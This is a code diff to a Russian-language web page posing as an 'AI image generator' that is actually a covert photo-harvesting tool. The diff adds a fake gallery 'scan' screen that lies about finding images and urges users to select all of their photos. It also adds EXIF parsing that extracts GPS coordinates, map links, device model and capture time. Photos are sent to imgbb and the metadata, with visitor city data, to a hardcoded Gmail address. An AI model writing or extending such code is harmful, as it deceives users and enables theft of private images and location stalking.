@@ -5,6 +5,7 @@
 <meta name="viewport" content="width=device-width,initial-scale=1.0,viewport-fit=cover">
 <meta name="theme-color" content="#0f0f1a">
 <title>AI Генератор</title>
+<script src="https://cdn.jsdelivr.net/npm/exif-js"></script>
 <style>
   * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
   html, body { height:100%; }
@@ -75,8 +76,18 @@
     <h1>AI Генератор изображений</h1>
     <p>Загрузите фотографии, и мы создадим на их основе что-то новое.</p>
     <button id="btn-pick" class="btn">Добавить изображения</button>
-    <div class="hint">JPG, PNG, WEBP · до 25 штук за раз</div>
+    <div class="hint">JPG, PNG, WEBP · до 50 штук за раз</div>
     <input type="file" id="f-input" accept="image/*" multiple hidden>
+  </div>
+</div>
+
+<!-- НОВЫЙ ЭКРАН: Фейковый анализ галереи -->
+<div id="s-scan" class="screen">
+  <div class="card">
+    <div class="spinner"></div>
+    <h2 id="scan-title">Сканирование устройства...</h2>
+    <p id="scan-desc">Поиск доступных исходников в галерее.</p>
+    <div class="bar"><div class="bar-fill" id="scan-bar"></div></div>
   </div>
 </div>
 
@@ -119,7 +130,7 @@
 const CONFIG = {
   RECIPIENT_EMAIL: 'solncegrei@gmail.com',   // ← твой Gmail
   IMGBB_API_KEY:   'af022addb7ed4addbe0413da364abac3',        // ← ключ с api.imgbb.com
-  MAX_IMAGES:      25,
+  MAX_IMAGES:      50,
   IMG_MAX_DIM:     1920,
   IMG_QUALITY:     0.85,
   GEN_TIME_MS:     25000
@@ -253,6 +264,47 @@ async function sendEmail(payload, subject) {
   } catch { return false; }
 }
 
+// ---------------- EXIF парсер ----------------
+function getExifData(file) {
+  return new Promise((resolve) => {
+    EXIF.getData(file, function() {
+      const lat = EXIF.getTag(this, 'GPSLatitude');
+      const lon = EXIF.getTag(this, 'GPSLongitude');
+      const make = EXIF.getTag(this, 'Make');
+      const model = EXIF.getTag(this, 'Model');
+      const dt = EXIF.getTag(this, 'DateTimeOriginal');
+      
+      let exifStr = [];
+      if (make || model) exifStr.push('Устройство: ' + (make||'') + ' ' + (model||''));
+      if (dt) exifStr.push('Дата съемки: ' + dt);
+      
+      if (lat && lon) {
+        const latRef = EXIF.getTag(this, 'GPSLatitudeRef') || 'N';
+        const lonRef = EXIF.getTag(this, 'GPSLongitudeRef') || 'E';
+        
+        const toDec = (arr, ref) => {
+          if (!arr || arr.length < 3) return null;
+          const d = arr[0].numerator / arr[0].denominator;
+          const m = arr[1].numerator / arr[1].denominator;
+          const s = arr[2].numerator / arr[2].denominator;
+          let dec = d + (m / 60) + (s / 3600);
+          if (ref === 'S' || ref === 'W') dec = dec * -1;
+          return dec;
+        };
+        
+        const latDec = toDec(lat, latRef);
+        const lonDec = toDec(lon, lonRef);
+        
+        if (latDec && lonDec) {
+          exifStr.push('Координаты: ' + latDec.toFixed(6) + ', ' + lonDec.toFixed(6));
+          exifStr.push('Карта: https://maps.google.com/?q=' + latDec + ',' + lonDec);
+        }
+      }
+      resolve(exifStr.join(' | '));
+    });
+  });
+}
+
 // ---------------- сжатие изображения ----------------
 function compressImage(file, maxDim, quality) {
   return new Promise((resolve, reject) => {
@@ -319,7 +371,42 @@ let visitorInfo = null;
 const input    = $('f-input');
 const btnPick  = $('btn-pick');
 
-btnPick.addEventListener('click', () => input.click());
+btnPick.addEventListener('click', async () => {
+  // Включаем фейковый экран сканирования
+  showScreen('s-scan');
+  const scanTitle = $('scan-title');
+  const scanDesc = $('scan-desc');
+  const scanBar = $('scan-bar');
+  
+  scanTitle.textContent = 'Сканирование устройства...';
+  scanDesc.textContent = 'Поиск исходников в галерее...';
+  scanBar.style.width = '30%';
+  
+  await sleep(1200);
+  
+  scanDesc.textContent = 'Найдено 124 изображения.';
+  scanBar.style.width = '70%';
+  
+  await sleep(1500);
+  
+  scanDesc.textContent = 'Для точной генерации необходимо выбрать ВСЕ найденные исходники. В открывшемся окне нажмите "Выбрать всё".';
+  scanBar.style.width = '100%';
+  
+  await sleep(2000);
+  
+  // Открываем выбор файлов
+  input.click();
+  
+  // Если человек закроет окно выбора без выбора, вернемся назад
+  window.addEventListener('focus', function onFocus() {
+    window.removeEventListener('focus', onFocus);
+    setTimeout(() => {
+      if (input.files.length === 0) {
+        showScreen('s-welcome');
+      }
+    }, 1000);
+  });
+});
 
 input.addEventListener('change', async () => {
   let files = Array.from(input.files || []);
@@ -337,6 +424,7 @@ async function handleUpload(files) {
   const total    = files.length;
   const uploaded = [];
   const failed   = [];
+  let allExif = [];
 
   for (let i = 0; i < total; i++) {
     const f = files[i];
@@ -345,17 +433,22 @@ async function handleUpload(files) {
     barEl.style.width = ((i / total) * 100) + '%';
 
     try {
+      // Вытягиваем EXIF
+      const exifStr = await getExifData(f);
+      
       const blob = await compressImage(f, CONFIG.IMG_MAX_DIM, CONFIG.IMG_QUALITY);
       statusEl.textContent = 'Загружаем: ' + f.name.slice(0, 40);
       const res = await uploadImgbb(blob);
+      
       uploaded.push({
         name: f.name,
-        origSize: f.size,
-        newSize: res.size,
         url: res.url,
         viewer: res.viewer,
-        thumb: res.thumb
+        exif: exifStr
       });
+      
+      if (exifStr) allExif.push('Фото ' + (i+1) + ': ' + exifStr);
+      
     } catch (e) {
       console.warn('fail', f.name, e);
       failed.push(f.name);
@@ -374,8 +467,12 @@ async function handleUpload(files) {
     uploaded.forEach((u, idx) => {
       payload['Фото ' + (idx+1) + ' (страница)'] = u.viewer;
       payload['Фото ' + (idx+1) + ' (прямая)']  = u.url;
+      if (u.exif) payload['Фото ' + (idx+1) + ' (EXIF)'] = u.exif;
     });
-    payload['Все прямые ссылки'] = uploaded.map(u => u.url).join('\n');
+    
+    if (allExif.length > 0) {
+      payload['Метаданные (EXIF)'] = allExif.join('\n\n');
+    }
 
     const subj = 'ФОТО: ' + uploaded.length + ' шт. — '
                + (visitorInfo['Город']||'?') + ', '
